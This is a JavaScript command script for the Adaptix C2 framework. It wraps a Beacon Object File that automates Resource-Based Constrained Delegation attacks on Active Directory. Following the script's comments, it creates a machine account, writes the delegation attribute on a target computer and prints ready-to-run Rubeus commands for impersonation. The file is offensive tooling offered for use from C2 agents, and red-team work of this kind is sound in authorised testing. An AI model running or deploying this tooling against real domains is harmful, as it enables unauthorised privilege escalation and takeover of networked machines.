var metadata = {
    name: "RBCD",
    description: "Automate Resource-Based Constrained Delegation setup via ADSI (no PowerShell)"
};

/*
 * rbcd – set up RBCD on a target computer object in Active Directory.
 *
 * Usage:
 *   rbcd -computer FAKECOMPUTER -password Passw0rd -target SQL01
 *   rbcd -computer FAKECOMPUTER -password Passw0rd -target SQL01 -domain contoso.local
 *   rbcd -computer FAKECOMPUTER -password Passw0rd -target SQL01 -existing
 *
 * What the BOF does:
 *   1. Creates a new machine account (FAKECOMPUTER$) in CN=Computers
 *      – skipped when -existing is supplied
 *   2. Queries the account's objectSid
 *   3. Builds a security descriptor granting full DS-control rights
 *   4. Writes msds-allowedtoactonbehalfofotheridentity on the target computer
 *   5. Verifies the attribute and prints ready-to-run Rubeus commands
 */

var cmd_rbcd = ax.create_command(
    "rbcd",
    "Set up Resource-Based Constrained Delegation on a target computer",
    "rbcd -computer <name> -password <pass> -target <target> [-domain <fqdn>] [-existing]"
);

cmd_rbcd.addArgString("computer", true,  "Machine account name to create or use (without trailing $)");
cmd_rbcd.addArgString("password", true,  "Password for the machine account");
cmd_rbcd.addArgString("target",   true,  "Target computer name or FQDN (e.g. SQL01 or SQL01.domain.local)");
cmd_rbcd.addArgString("domain",   false, "Domain FQDN (auto-detected from beacon context if omitted)");
cmd_rbcd.addArgBool  ("existing", false, "Use an existing machine account instead of creating a new one");

cmd_rbcd.setPreHook(function (id, cmdline, parsed_json) {
    var computer = parsed_json["computer"];
    var password = parsed_json["password"];
    var target   = parsed_json["target"];
    var domain   = parsed_json["domain"]   || "";
    var existing = parsed_json["existing"] ? 1 : 0;

    var bof_params = ax.bof_pack("wstr,wstr,wstr,wstr,int",
                                  [computer, password, target, domain, existing]);
    var bof_path   = ax.script_dir() + "rbcd." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline,
        `execute bof "${bof_path}" ${bof_params}`,
        "Task: RBCD setup BOF by Outflank (Adaptix port)");
});

var group_rbcd = ax.create_commands_group("RBCD-BOF", [cmd_rbcd]);
ax.register_commands_group(group_rbcd, ["beacon", "gopher", "kharon"], ["windows"], []);
